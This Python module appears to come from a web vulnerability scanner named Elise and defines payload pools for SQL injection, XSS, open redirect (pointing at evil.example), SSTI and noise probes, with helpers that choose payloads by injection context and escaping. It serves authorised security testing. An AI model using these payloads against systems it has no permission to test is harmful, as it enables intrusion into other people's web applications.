# backend/modules/payloads.py
"""
Curated payload pools for Elise.

⚠️ Use responsibly. These payloads are for security testing on systems
you own or have explicit permission to assess. Unauthorized use can be illegal.

Design goals
------------
- Small but effective core sets (works in CI and quick scans).
- Stable ordering (most generally useful first).
- Light context filtering via `payload_pool_for(family, context)`.
- Compatible with rankers and heuristics used in recommender.py.

Families provided
-----------------
- sqli
- xss
- redirect
- base
- ssti  (optional; included for completeness)

If you need larger/experimental pools, maintain them in a separate module
(e.g., payloads_ext.py) and import/merge here.
"""

from __future__ import annotations
from typing import Dict, Iterable, List, Optional

# ----------------------------- SQL Injection ---------------------------------

# Boolean/tautology probes (portable; short; low-breakage)
SQLI_BOOLEAN: List[str] = [
    "' OR '1'='1' --",
    "\" OR 1=1 --",
    "') OR ('1'='1",
    "1 OR 1=1",
    "1) OR (1=1",
]

# UNION-based probes (good differential behavior where errors leak)
SQLI_UNION: List[str] = [
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
]

# Time-based probes (latency oracles)
SQLI_TIME: List[str] = [
    "1 AND SLEEP(3)--",               # MySQL/MariaDB
    "1;SELECT pg_sleep(3)--",         # PostgreSQL
    "';WAITFOR DELAY '0:0:3'--",      # SQL Server
]

# Minimal error-based / engine-nudging (kept tiny to avoid spam)
SQLI_ERROR: List[str] = [
    "'||CAST(1 AS INT)--",           # generic concat/coerce; often triggers syntax differences
    "'))/**/OR/**/(('1'='1",         # obfuscated OR (baseline evasion taste)
]

SQLI: List[str] = (
    SQLI_BOOLEAN
    + SQLI_UNION
    + SQLI_TIME
    + SQLI_ERROR
)

# ----------------------------- Cross-Site Scripting --------------------------

# Tag/DOM-based (HTML contexts) - prioritized for html_body context
XSS_TAG: List[str] = [
    "<svg onload=alert(1)>",           # Most reliable, works in most contexts
    "<img src=x onerror=alert(1)>",    # Classic, widely supported
    "<script>alert(1)</script>",       # Traditional but often filtered
]

# Quote-balanced attribute breakouts (for attr + html escaping)
XSS_ATTR_QUOTE_BALANCED: List[str] = [
    "\" onmouseover=\"alert(1)\" x=\"",    # Double quote balanced
    "' autofocus onfocus=alert(1) x='",    # Single quote balanced
    "\" onfocus=alert(1) autofocus x=\"",  # Alternative double quote
    "' onmouseover=alert(1) x='",          # Alternative single quote
]

# General attribute injection (fallback)
XSS_ATTR: List[str] = [
    "\" onmouseover=\"alert(1)\" x=\"",
    "' autofocus onfocus=alert(1) x='",
]

# JavaScript string breakouts (for js_string context)
XSS_JS_STRING: List[str] = [
    "\";alert(1);//",                   # Double quote + semicolon breakout
    "';alert(1);//",                    # Single quote + semicolon breakout
    "\";alert(1);var x=\"",             # Double quote with variable continuation
    "';alert(1);var x='",               # Single quote with variable continuation
]

# URL-based (for url context)
XSS_URL: List[str] = [
    "javascript:alert(1)",              # Classic javascript: URI
    "javascript:alert(1);void(0)",      # With void to prevent navigation
    "data:text/html,<script>alert(1)</script>",  # Data URI
]

# CSS-based (conservative, minimal set)
XSS_CSS: List[str] = [
    "expression(alert(1))",             # IE expression (legacy)
    "url(javascript:alert(1))",         # CSS url() with javascript:
]

XSS: List[str] = XSS_TAG + XSS_ATTR + XSS_URL

# ----------------------------- Open Redirect ---------------------------------

REDIRECT: List[str] = [
    "https://example.org/",
    "//evil.example",
    "https:%2F%2Fevil.example",
    "/\\evil.example",     # backslash trick
    "http://127.0.0.1",    # loopback (often blocked; useful oracle)
]

# ----------------------------- Base / Noise ----------------------------------

# Baseline mutation/noise payloads (useful for differential testing)
BASE: List[str] = [
    "*",
    "%27",          # '
    "%22",          # "
    "()",
    "{}",
    "[]",
    "%0d%0a",       # CRLF probe (very mild)
]

# ----------------------------- SSTI (optional) -------------------------------

SSTI: List[str] = [
    "{{7*7}}",          # Jinja2-style
    "${{7*7}}",         # Spring/EL-style
    "<%= 7*7 %>",       # ERB
    "#{7*7}",           # Thymeleaf/OGNL-style
]

# ----------------------------- Family mapping --------------------------------

PAYLOADS_BY_FAMILY: Dict[str, List[str]] = {
    "sqli": SQLI,
    "xss": XSS,
    "redirect": REDIRECT,
    "base": BASE,
    "ssti": SSTI,
}

# ----------------------------- Context filter --------------------------------

def _filter_by_context(pool: List[str], family: str, context: Optional[Dict] = None) -> List[str]:
    """
    Light, non-destructive filtering based on the injection context.

    context keys (best-effort):
      - injection_mode: 'query' | 'form' | 'json' | 'headers' | 'path' | 'multipart'
      - content_type:   e.g., 'application/json', 'text/html'
    """
    if not pool:
        return pool
    ctx = context or {}
    mode = str(ctx.get("injection_mode") or ctx.get("mode") or "").lower()
    ct   = str(ctx.get("content_type") or "").lower()

    out = pool

    try:
        if family == "xss":
            # JSON body injection: avoid raw tags that break JSON early
            if mode == "json":
                filtered = [p for p in out if "<script" not in p and "<img" not in p and "<svg" not in p]
                if filtered:
                    out = filtered
            # Headers: prefer URL/attr style over full <script>
            if mode == "headers":
                filtered = [p for p in out if "javascript:" in p or "onerror=" in p or "onload=" in p] or out
                out = filtered

        elif family == "sqli":
            # Path-only injection: keep short boolean/time probes; drop UNION (often breaks routing)
            if mode == "path":
                filtered = [p for p in out if "union select" not in p.lower()] or out
                out = filtered

        # Redirect typically needs no filtering.

    except Exception:
        return pool

    return out or pool


# ----------------------------- Context-Aware XSS Payload Selection -------------

def payload_pool_for_xss(context: str, escaping: str) -> List[str]:
    """
    Return context-optimized XSS payload pool based on reflection context and escaping.
    
    Args:
        context: XSS context type ("html_body", "attr", "js_string", "url", "css")
        escaping: Escaping type ("raw", "html", "url", "js", "unknown")
    
    Returns:
        List of payloads optimized for the given context, limited to top 3 families
    """
    if not context or context == "unknown":
        # Fallback to general XSS pool
        return XSS[:3]
    
    context = context.lower()
    escaping = escaping.lower()
    
    # html_body context: prioritize tag-based vectors
    if context == "html_body":
        if escaping == "raw":
            return XSS_TAG[:3]  # Raw reflection, use most effective tags
        else:
            # HTML-escaped, still try tags but they may be less effective
            return XSS_TAG[:2] + XSS_ATTR[:1]
    
    # attr context: prioritize quote-balanced breakouts
    elif context == "attr":
        if escaping in ["html", "raw"]:
            # HTML escaping or raw - use quote-balanced breakouts
            return XSS_ATTR_QUOTE_BALANCED[:3]
        else:
            # Other escaping types - fallback to general attr
            return XSS_ATTR[:3]
    
    # js_string context: prioritize quote + semicolon breakouts
    elif context == "js_string":
        if escaping in ["raw", "js"]:
            # Raw or JS escaping - use JS string breakouts
            return XSS_JS_STRING[:3]
        else:
            # Other escaping - try JS breakouts but may be less effective
            return XSS_JS_STRING[:2] + XSS_TAG[:1]
    
    # url context: prioritize javascript: URIs
    elif context == "url":
        if escaping in ["raw", "url"]:
            # Raw or URL escaping - use javascript: URIs
            return XSS_URL[:3]
        else:
            # Other escaping - try URLs but may be less effective
            return XSS_URL[:2] + XSS_TAG[:1]
    
    # css context: conservative approach
    elif context == "css":
        if escaping in ["raw", "css"]:
            # Raw or CSS escaping - use CSS-specific payloads
            return XSS_CSS[:2] + XSS_TAG[:1]
        else:
            # Other escaping - fallback to html_body approach
            return XSS_TAG[:3]
    
    # Unknown context - fallback to general pool
    else:
        return XSS[:3]

# ----------------------------- Public API ------------------------------------

def payload_pool_for(family: str, context: Optional[Dict] = None) -> List[str]:
    """
    Return the canonical pool for a given family, optionally filtered by context.

    Example:
        payloads = payload_pool_for("sqli", context={"injection_mode": "path"})
    """
    fam = (family or "").lower().strip()
    pool = PAYLOADS_BY_FAMILY.get(fam, [])
    # Always return a copy (callers may mutate)
    pool = list(pool)
    return _filter_by_context(pool, fam, context)


def all_families() -> List[str]:
    """List available families."""
    return list(PAYLOADS_BY_FAMILY.keys())


def iter_all_payloads() -> Iterable[str]:
    """Iterate all payloads across families (de-duplicated, stable order)."""
    seen = set()
    for fam in ("sqli", "xss", "redirect", "ssti", "base"):
        for p in PAYLOADS_BY_FAMILY.get(fam, []):
            if p not in seen:
                seen.add(p)
                yield p


__all__ = [
    "SQLI", "XSS", "REDIRECT", "BASE", "SSTI",
    "XSS_TAG", "XSS_ATTR", "XSS_ATTR_QUOTE_BALANCED", "XSS_JS_STRING", "XSS_URL", "XSS_CSS",
    "PAYLOADS_BY_FAMILY",
    "payload_pool_for", "payload_pool_for_xss", "all_families", "iter_all_payloads",
]
